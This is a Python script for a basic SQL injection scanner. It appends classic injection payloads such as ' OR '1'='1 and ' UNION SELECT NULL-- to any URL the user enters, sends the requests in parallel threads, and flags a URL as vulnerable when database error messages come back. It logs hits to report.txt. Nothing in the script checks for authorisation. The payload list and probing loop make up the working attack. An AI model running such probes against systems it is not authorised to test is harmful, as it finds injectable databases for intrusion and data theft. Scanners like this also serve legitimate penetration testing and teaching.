import requests
import time
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# =========================
# CONFIGURATION
# =========================

payloads = [
    "'",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "'--",
    "' OR 1=1--",
    "' UNION SELECT NULL--",
]

sql_errors = [
    "sql syntax",
    "mysql",
    "syntax error",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "warning: mysql",
    "odbc sql server driver",
    "sqlite error",
]

headers = {
    "User-Agent": "Mozilla/5.0 SQLi-Scanner"
}

# =========================
# FUNCTIONS
# =========================

def check_sqli(url, payload):

    target = url + payload

    try:
        response = requests.get(
            target,
            headers=headers,
            timeout=5
        )

        for error in sql_errors:

            if error.lower() in response.text.lower():

                print(
                    Fore.RED +
                    f"[VULNERABLE] {target}"
                )

                save_report(target, payload)

                return

        print(
            Fore.GREEN +
            f"[SAFE] {target}"
        )

    except requests.exceptions.RequestException as e:

        print(
            Fore.YELLOW +
            f"[ERROR] {target} -> {e}"
        )


def save_report(target, payload):

    with open("report.txt", "a") as file:

        file.write(
            f"VULNERABLE URL: {target}\n"
        )

        file.write(
            f"PAYLOAD: {payload}\n"
        )

        file.write(
            "-" * 50 + "\n"
        )


# =========================
# MAIN PROGRAM
# =========================

print(
    Fore.CYAN +
    "\n===== SQL Injection Scanner =====\n"
)

url = input(
    Fore.WHITE +
    "Enter target URL: "
)

print(
    Fore.BLUE +
    "\n[+] Starting Scan...\n"
)

with ThreadPoolExecutor(max_workers=4) as executor:

    for payload in payloads:

        executor.submit(
            check_sqli,
            url,
            payload
        )

        time.sleep(1)

print(
    Fore.CYAN +
    "\n[+] Scan Completed"
)

print(
    Fore.CYAN +
    "[+] Report saved in report.txt\n"
)